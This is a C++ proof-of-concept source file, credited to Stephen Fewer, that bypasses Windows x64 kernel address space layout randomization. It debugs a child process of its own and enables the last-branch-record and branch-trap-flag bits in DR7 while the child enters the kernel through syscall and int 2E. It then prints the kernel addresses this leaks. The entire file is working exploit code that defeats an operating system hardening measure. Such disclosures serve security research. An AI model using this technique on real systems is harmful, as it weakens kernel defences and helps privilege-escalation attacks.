// Last Branch Record (LBR) Kernel Address Space Layout Randomization (KASLR) Bypass PoC.
// Stephen Fewer, 22 May 2020.
#include <windows.h>
#include <array>
#include <string>
#include <inttypes.h>
#include <intrin.h>

#if !defined(_M_AMD64)
#error "This PoC is for x64"
#endif

#define EFLAGS_TRAPFLAG					(1 << 8)

#define DR7_LASTBRANCHRECORD			(1 << 8)

#define DR7_BRANCHTRAPFLAG				(1 << 9)

#define MmHighestUserAddress			0x00007FFFFFFEFFFF

#define PTR_TYPE(P)                     ((P) == 0 ? L"nullptr" : ((P) > MmHighestUserAddress ? L"Kernel" : L"User"))

#define CHILDTHREADPROC_EXITCODE		0xDEADC0DE
#define CHILDTHREADPROC_PARAMETER		0xCAFEF00D

// function definition in EnterKernel.asm
extern "C" void EnterKernelViaSyscallAndInt2E(void);

void PrintCPUInfo(void);

// the child process being debuggeed will run this in a thread and the parent process will
// enable BTF/LBR for the thread. The thread will branch into the kernel via both syscall and int 2E
// so we can observe the LBR of this happening, leaking the kernel address upon a sysret.
DWORD WINAPI ChildThreadProc(LPVOID lpParameter)
{
	/*
		EnterKernelViaSyscallAndInt2E PROC
			xor rax, rax
			syscall
			xor rax, rax
			int 2Eh
			ret
		EnterKernelViaSyscallAndInt2E ENDP
	*/
	EnterKernelViaSyscallAndInt2E();
	
	// return a magic value in RAX so parent debugging can see and know to stop LBR
	return CHILDTHREADPROC_EXITCODE;
}

int wmain(int argc, wchar_t* argv[])
{
	bool showall = false;

	for (int i = 0; i < argc; i++)
	{
		if (wcscmp(argv[i], L"/child") == 0)
		{
			// we pass CHILDTHREADPROC_PARAMETER so our parent process can identify thsi thread being created.
			HANDLE h = CreateThread(NULL, 0, &ChildThreadProc, (LPVOID)CHILDTHREADPROC_PARAMETER, 0, NULL);
			if (h != NULL)
				WaitForSingleObject(h, INFINITE);

			return 0;
		}
		else if (wcscmp(argv[i], L"/showall") == 0)
		{
			showall = true;
		}
	}

	PrintCPUInfo();

	STARTUPINFOW si = { 0 };

	PROCESS_INFORMATION pi = { 0 };

	si.cb = sizeof(si);

	if (CreateProcessW(
		argv[0],
		(LPWSTR)L"/child",
		nullptr,
		nullptr,
		FALSE,
		DEBUG_ONLY_THIS_PROCESS,
		nullptr,
		nullptr,
		&si,
		&pi
	))
	{
		DEBUG_EVENT de;

		bool running = true;

		HANDLE childthreadproc_handle = INVALID_HANDLE_VALUE;

		DWORD childthreadproc_id = 0;

		while (running && WaitForDebugEvent(&de, INFINITE))
		{
			HANDLE thread_handle = INVALID_HANDLE_VALUE;

			switch (de.dwDebugEventCode)
			{
			case EXIT_PROCESS_DEBUG_EVENT:
			{
				running = false;
				break;
			}
			case CREATE_THREAD_DEBUG_EVENT:
			{
				CONTEXT ctx; 

				ctx.ContextFlags = CONTEXT_INTEGER;

				if (GetThreadContext(de.u.CreateThread.hThread, &ctx))
				{
					// RDX will have the lpParameter that is passed vi CreateThread to the ChildThreadProc.
					// We could test de.u.CreateThread.lpStartAddress == &ChildThreadProc but that assumes the child image was not relocated.
					if (ctx.Rdx == CHILDTHREADPROC_PARAMETER)
					{
						// keep a record of the thread we want to enable BTF/LBR on
						childthreadproc_handle = de.u.CreateThread.hThread;

						childthreadproc_id = de.dwThreadId;

						// go on to enable BTF/LBR...
						thread_handle = childthreadproc_handle;
					}
				}
				break;
			}
			case EXCEPTION_DEBUG_EVENT:
			{
				if (de.dwThreadId == childthreadproc_id &&
					de.u.Exception.ExceptionRecord.ExceptionCode == STATUS_SINGLE_STEP)
				{
					// go on to re-enable BTF/LBR (AS TF is cleared upon each debug exception)...
					thread_handle = childthreadproc_handle;

					// LBR seems to set/clear the high bit, we need to handle this here before we inspect the pointers
					if ((de.u.Exception.ExceptionRecord.ExceptionInformation[0] >> 48) == 0x8000)
						de.u.Exception.ExceptionRecord.ExceptionInformation[0] &= 0x7fffffffffffffff;
					else if ((de.u.Exception.ExceptionRecord.ExceptionInformation[0] >> 48) == 0x7FFF)
						de.u.Exception.ExceptionRecord.ExceptionInformation[0] |= 0x8000000000000000;

					if ((de.u.Exception.ExceptionRecord.ExceptionInformation[1] >> 48) == 0x8000)
						de.u.Exception.ExceptionRecord.ExceptionInformation[1] &= 0x7fffffffffffffff;
					else if ((de.u.Exception.ExceptionRecord.ExceptionInformation[1] >> 48) == 0x7FFF)
						de.u.Exception.ExceptionRecord.ExceptionInformation[1] |= 0x8000000000000000;

					// have we seen a kernel pointer? (or we can run this PoC with a /showall to dump every branch)
					if ((de.u.Exception.ExceptionRecord.ExceptionInformation[0] > MmHighestUserAddress ||
						de.u.Exception.ExceptionRecord.ExceptionInformation[1] > MmHighestUserAddress) || showall)
					{
						CONTEXT ctx = { 0 };

						ctx.ContextFlags = CONTEXT_ALL;

						GetThreadContext(thread_handle, &ctx);

						wprintf(
							L"[Last Branch Record] Via ExceptionRecord: 0x%" PRIxPTR " (%s) -> 0x%" PRIxPTR " (%s). Via CONTEXT 0x%" PRIxPTR " (%s) -> 0x%" PRIxPTR " (%s)\n",
							de.u.Exception.ExceptionRecord.ExceptionInformation[0],
							PTR_TYPE(de.u.Exception.ExceptionRecord.ExceptionInformation[0]),
							de.u.Exception.ExceptionRecord.ExceptionInformation[1],
							PTR_TYPE(de.u.Exception.ExceptionRecord.ExceptionInformation[1]),
							ctx.LastBranchFromRip,
							PTR_TYPE(ctx.LastBranchFromRip),
							ctx.LastBranchToRip,
							PTR_TYPE(ctx.LastBranchToRip)
						);
					}
				}
				break;
			}
			default:
			{
				break;
			}
			}

			// set TF in EFLAGS and BTF/LBR in DR7...
			if (thread_handle != INVALID_HANDLE_VALUE)
			{
				CONTEXT ctx;

				ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL | CONTEXT_DEBUG_REGISTERS;

				if (GetThreadContext(thread_handle, &ctx))
				{
					if (ctx.Rax == CHILDTHREADPROC_EXITCODE)
					{
						ctx.Dr7 = 0;
					}
					else
					{
						ctx.EFlags |= EFLAGS_TRAPFLAG;

						ctx.Dr7 |= DR7_LASTBRANCHRECORD;

						ctx.Dr7 |= DR7_BRANCHTRAPFLAG;

						if (!SetThreadContext(thread_handle, &ctx))
							break;
					}
				}
			}

			if (!ContinueDebugEvent(de.dwProcessId, de.dwThreadId, DBG_CONTINUE))
				break;
		}
	}

	CloseHandle(pi.hThread);

	CloseHandle(pi.hProcess);

	return 0;
}

void PrintCPUInfo(void)
{
	std::wstring cpu_model;

	for (int i = 0; i < 3; i++)
	{
		char data[(sizeof(DWORD) * 4) + 1] = { 0 };

		__cpuid((int*)&data, 0x80000002 + i);

		int wsz = MultiByteToWideChar(CP_UTF8, 0, (char*)&data, static_cast<int>(strlen(data)), NULL, 0);
		if (wsz != 0)
		{
			std::wstring wstr(wsz, 0);

			if (MultiByteToWideChar(CP_UTF8, 0, (char*)&data, static_cast<int>(strlen(data)), &wstr[0], wsz) != 0)
				cpu_model += wstr;
		}
	}

	wprintf(L"[CPU] model=%s\n", cpu_model.c_str());

	DWORD data[4] = { 0 };
	__cpuidex((int*)&data, 1, 0);

	BYTE stepping = (data[0] & 0xF);

	WORD model = ((data[0] >> 4) & 0xF);

	WORD family = ((data[0] >> 8) & 0xF);

	if (family == 6 || family == 15)
	{
		model += (((data[0] >> 16) & 0xF) << 4);

		if (family == 15)
		{
			family += (((data[0] >> 20) & 0xFF) << 4);
		}
	}

	wprintf(
		L"[CPU] family=0x%" PRIx16 ", model=0x%" PRIx16 ", stepping=0x%" PRIx8 "\n",
		family,
		model,
		stepping
	);
}
